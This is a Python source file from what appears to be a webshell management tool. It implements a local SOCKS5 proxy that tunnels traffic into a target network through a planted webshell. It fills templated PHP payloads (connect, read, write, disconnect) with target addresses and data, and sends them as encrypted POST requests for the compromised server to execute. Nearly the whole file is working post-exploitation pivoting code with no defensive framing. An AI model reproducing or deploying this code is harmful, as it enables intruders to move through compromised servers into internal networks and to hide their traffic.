from socket import socket, AF_INET6, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR, \
    gethostbyname, inet_ntoa, inet_aton, inet_ntop, timeout
import struct
import requests
import json
import base64
from Crypto.Hash import MD5
import time
from PyQt5.QtCore import QThread, pyqtSignal


class Socks5Service(QThread):
    signalError = pyqtSignal(str)

    def __init__(self, port, httpService):
        self.socketTimeout = 5
        self.listenIp = "127.0.0.1"
        self.listenPort = port
        self.httpService = httpService
        self.stopFlag = False
        super(Socks5Service, self).__init__()

    def run(self):
        servSock = socket(AF_INET, SOCK_STREAM)
        servSock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        servSock.bind((self.listenIp, self.listenPort))
        servSock.listen(1000)
        while True:
            try:
                sock, addr_info = servSock.accept()
                sock.settimeout(self.socketTimeout)
                SocksSession(sock, self.httpService).start()
            except Exception as e:
                print(e)
                self.signalError.emit(str(e))

            if self.stopFlag:
                break
        servSock.close()


class SocksSession(QThread):
    signalError = pyqtSignal(str)

    def __init__(self, sock, httpService):
        super(SocksSession, self).__init__()
        self.sock = sock
        self.httpService = httpService
        self.httpSession = None

    def parseSocks5(self):
        nmethods, methods = (self.sock.recv(1), self.sock.recv(1))
        self.sock.sendall(b"\x05\x00")
        ver = self.sock.recv(1)
        if ver == b"\x02":  # this is a hack for proxychains
            ver, cmd, rsv, atyp = (self.sock.recv(1), self.sock.recv(1), self.sock.recv(1), self.sock.recv(1))
        else:
            cmd, rsv, atyp = (self.sock.recv(1), self.sock.recv(1), self.sock.recv(1))
        target = None
        targetPort = None
        if atyp == b"\x01":  # IPv4
            target = self.sock.recv(4)      # IP and Port (6 bytes)
            targetPort = self.sock.recv(2)
            target = inet_ntoa(target)
        elif atyp == b"\x03":  # Hostname
            targetLen = ord(self.sock.recv(1))  # length of hostname (1 byte)
            target = self.sock.recv(targetLen)
            targetPort = self.sock.recv(2)
            try:
                target = gethostbyname(target)
            except:
                target = target.decode()
        elif atyp == b"\x04":  # IPv6
            target = self.sock.recv(16)
            targetPort = self.sock.recv(2)
            target = inet_ntop(AF_INET6, target)
        return cmd, target, targetPort

    def run(self):
        ver = self.sock.recv(1)
        if ver == b"\x05":
            cmd, target, targetPort = self.parseSocks5()
            if cmd == b"\x01":  # CONNECT:
                try:
                    serverIp = inet_aton(target)
                except:
                    serverIp = inet_aton('127.0.0.1')
                targetPortNum = struct.unpack('>H', targetPort)[0]
                sockId = MD5.new((target+str(targetPort)+str(time.time())).encode()).hexdigest()[:16]
                self.httpSession = HttpSession(self.httpService, sockId)

                SocksConnect(self.httpSession, target, targetPortNum, sockId).start()
                time.sleep(1)
                data = b"\x05\x00\x00\x01" + serverIp + targetPort
                self.sock.sendall(data)

                connInfo = "{}:{}".format(target, targetPortNum)
                SocksWrite(self.httpSession, self.sock, sockId, connInfo).start()
                SocksRead(self.httpSession, self.sock, sockId, connInfo).start()
            else:
                self.signalError.emit("Socks5 - Unknown CMD")


class SocksConnect(QThread):
    def __init__(self, httpSession, target, targetPort, socksId):
        super(SocksConnect, self).__init__()
        self.httpSession = httpSession
        self.target = target
        self.targetPort = targetPort
        self.socksId = socksId

    def run(self):
        print("Connect: {}:{}".format(self.target, self.targetPort))
        with open("./Core/payload/httpSocks/connect.php", "rb") as f:
            payload = f.read().replace(b"__IP__", base64.b64encode(self.target.encode()))
            payload = payload.replace(b"__PORT__", str(self.targetPort).encode())
            payload = payload.replace(b"__SOCKID__", base64.b64encode(self.socksId.encode()))
        data = {
            "code": base64.b64encode(payload).decode()
        }

        self.httpSession.doPOST(data)


class SocksRead(QThread):
    def __init__(self, httpSession, sock, sockId, connInfo):
        super(SocksRead, self).__init__()
        self.httpSession = httpSession
        self.sock = sock
        self.sockId = sockId
        self.connInfo = connInfo

    def run(self):
        with open("./Core/payload/httpSocks/read.php", "rb") as f:
            payload = f.read().replace(b"__SOCKID__", base64.b64encode(self.sockId.encode()))
        postData = {
            "code": base64.b64encode(payload).decode()
        }
        while True:
            try:
                if getattr(self.sock, '_closed'):
                    break
                result = self.httpSession.doPOST(postData)
                if result["status"]:
                    data = result["data"]
                    if data["status"]:
                        if len(data["data"]):
                            rData = base64.b64decode(data["data"].encode())
                            print("recvData: <=={} len: {}".format(self.connInfo, len(rData)))
                            self.sock.send(rData)
                        else:
                            time.sleep(0.1)
                    else:
                        break
                else:
                    pass
            except:
                break
        if not getattr(self.sock, '_closed'):
            print("close reading", self.sockId)
            self.sock.close()
            self.httpSession.closeConnect(self.sockId)


class SocksWrite(QThread):
    def __init__(self, httpSession, sock, sockId, connInfo):
        super(SocksWrite, self).__init__()
        self.httpSession = httpSession
        self.sock = sock
        self.sockId = sockId
        self.connInfo = connInfo

    def run(self):
        while True:
            try:
                recvData = self.sock.recv(1024)
                if not recvData:
                    break
                with open("./Core/payload/httpSocks/write.php", "rb") as f:
                    payload = f.read().replace(b"__SOCKID__", base64.b64encode(self.sockId.encode()))
                    payload = payload.replace(b"__DATA__", base64.b64encode(recvData))
                data = {
                    "code": base64.b64encode(payload).decode()
                }
                print("sendData: ==>{} len: {}".format(self.connInfo, len(recvData)))
                result = self.httpSession.doPOST(data)
                if result["status"]:
                    data = result["data"]
                    if not data["status"]:
                        print("write error")
                        break
                else:
                    print(result["message"])
            except timeout:
                continue
            except OSError:
                break
        if not getattr(self.sock, '_closed'):
            print("close writing", self.sockId)
            self.sock.close()
            self.httpSession.closeConnect(self.sockId)


class HttpSession:
    def __init__(self, httpService, sockId):
        self.httpService = httpService
        self.sockId = sockId
        self.url = None
        self.cookies = {}
        self.headers = {}
        self.proxy = {}

        self.initRequest()

    def initRequest(self):
        self.url = self.httpService.webshell.url
        for cookie in self.httpService.nam.cookieJar().allCookies():
            self.cookies[cookie.name().data().decode()] = cookie.value().data().decode()
        for header in json.loads(self.httpService.webshell.httpHeader):
            self.headers[header["name"]] = header["value"]
        self.headers["Content-Type"] = "application/x-www-form-urlencoded"
        self.headers["Connection"] = "Keep-Alive"
        if self.httpService.proxy and self.httpService.proxy.id:
            proxy = '{}://{}:{}@{}:{}'.format(
                self.httpService.proxy.protocol, self.httpService.proxy.user,
                self.httpService.proxy.passwd, self.httpService.proxy.server, self.httpService.proxy.port
            )
            self.proxy = {
                'http': proxy,
                'https': proxy
            }

    def closeConnect(self, sockId):
        with open("./Core/payload/httpSocks/disconnect.php", "rb") as f:
            payload = f.read().replace(b"__SOCKID__", base64.b64encode(sockId.encode()))
        data = {
            "code": base64.b64encode(payload).decode()
        }
        return self.doPOST(data)

    def doPOST(self, data):
        result = {
            "status": True,
            "message": ""
        }
        try:
            data = self.httpService.AESEncrypt(self.httpService.aesKey, json.dumps(data))
            response = requests.post(self.url, headers=self.headers, cookies=self.cookies, proxies=self.proxy, data=data, timeout=5)
            if response.status_code == 200:
                res = self.httpService.AESDecrypt(self.httpService.aesKey, response.content.decode(errors="replace"))
                result["data"] = json.loads(base64.b64decode(res.encode()).decode(errors="replace"))
        except Exception as e:
            result["status"] = False
            result["message"] = "postError" + str(e)
        return result

